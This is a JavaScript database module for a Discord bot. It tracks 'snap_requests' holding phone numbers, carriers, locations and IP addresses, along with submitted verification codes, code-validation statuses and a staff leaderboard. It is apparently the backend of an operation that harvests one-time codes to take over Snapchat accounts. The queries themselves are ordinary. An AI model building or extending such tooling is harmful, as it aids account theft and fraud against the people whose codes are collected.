/**
 * database.js — Neon PostgreSQL queries
 */

import { neon } from "@neondatabase/serverless";
import { CONFIG } from "./config.js";

export const sql = neon(CONFIG.DATABASE_URL);

// ─── Single-row lookups ───────────────────────────────────────────────────────

export async function getRequestByPhone(phone) {
    const rows = await sql`
        SELECT * FROM snap_requests WHERE phone = ${phone} LIMIT 1
    `;
    return rows[0] || null;
}

/**
 * Returns the Discord user ID of whoever claimed this request.
 * Used as fallback when the in-memory claimedBy Map is empty (bot restart).
 * Requires the claimed_by_discord_id column (migration_v2.2.sql).
 */
export async function getClaimedBy(phone) {
    const rows = await sql`
        SELECT claimed_by_discord_id FROM snap_requests WHERE phone = ${phone} LIMIT 1
    `;
    return rows[0]?.claimed_by_discord_id ?? null;
}

export async function updateStatus(phone, status) {
    await sql`UPDATE snap_requests SET status = ${status} WHERE phone = ${phone}`;
}

// ─── Logging ──────────────────────────────────────────────────────────────────

export async function logAction(action, details) {
    try {
        await sql`
            INSERT INTO snap_logs (action, details)
            VALUES (${action}, ${JSON.stringify(details)})
        `;
    } catch {
        // snap_logs may not exist in older deployments — non-fatal
    }
}

// ─── Polling queries ──────────────────────────────────────────────────────────

export async function getPendingRequests(lastId) {
    return await sql`
        SELECT id, username, phone, operator, country, city, ip_address, status, created_at, updated_at
        FROM snap_requests
        WHERE id > ${lastId} AND status = ${"pending"}
        ORDER BY id ASC
    `;
}

/**
 * Returns code_submitted requests updated after `since`.
 * Timestamp-based so retries (same row, new UPDATE) are detected.
 */
export async function getCodeSubmittedRequests(since) {
    return await sql`
        SELECT id, username, phone, operator, country, city, ip_address,
               staff_code, code_length, status, created_at, updated_at
        FROM snap_requests
        WHERE status = ${"code_submitted"}
          AND staff_code IS NOT NULL
          AND updated_at > ${since.toISOString()}
        ORDER BY updated_at ASC
    `;
}

// ─── Stats queries ────────────────────────────────────────────────────────────

export async function getGlobalStats() {
    const [totals] = await sql`
        SELECT
            COUNT(*)                                              AS total,
            COUNT(*) FILTER (WHERE status = 'pending')           AS pending,
            COUNT(*) FILTER (WHERE status = 'processing')        AS processing,
            COUNT(*) FILTER (WHERE status = 'waiting_code')      AS waiting,
            COUNT(*) FILTER (WHERE status = 'code_submitted')    AS submitted,
            COUNT(*) FILTER (WHERE status = 'completed')         AS completed,
            COUNT(*) FILTER (WHERE status = 'wrong_number')      AS wrong,
            COUNT(*) FILTER (WHERE status = 'retry_code')        AS retry
        FROM snap_requests
    `;
    const [banRow] = await sql`SELECT COUNT(*) AS count FROM banned_ips`;
    return { ...totals, banned: banRow.count };
}

export async function getTodayStats() {
    const [today] = await sql`
        SELECT
            COUNT(*)                                         AS requests,
            COUNT(*) FILTER (WHERE status = 'completed')    AS completed
        FROM snap_requests
        WHERE created_at >= CURRENT_DATE
    `;
    return today;
}

export async function getOperatorStats() {
    return await sql`
        SELECT operator, COUNT(*) AS count
        FROM snap_requests
        GROUP BY operator
        ORDER BY count DESC
    `;
}

export async function getHourlyStats() {
    return await sql`
        SELECT EXTRACT(HOUR FROM created_at) AS hour, COUNT(*) AS count
        FROM snap_requests
        WHERE created_at >= NOW() - INTERVAL '24 hours'
        GROUP BY hour
        ORDER BY hour
    `;
}

export async function getStaffLeaderboard(limit = 10) {
    return await sql`
        SELECT
            details->>'staff_tag' AS staff,
            COUNT(*)              AS validations
        FROM snap_logs
        WHERE action = ${"true_code"}
          AND details->>'staff_tag' IS NOT NULL
        GROUP BY details->>'staff_tag'
        ORDER BY validations DESC
        LIMIT ${limit}
    `;
}

export async function getStaffActivity() {
    return await sql`
        SELECT
            details->>'staff_tag' AS staff,
            action,
            COUNT(*)              AS count
        FROM snap_logs
        WHERE details->>'staff_tag' IS NOT NULL
        GROUP BY details->>'staff_tag', action
        ORDER BY count DESC
    `;
}
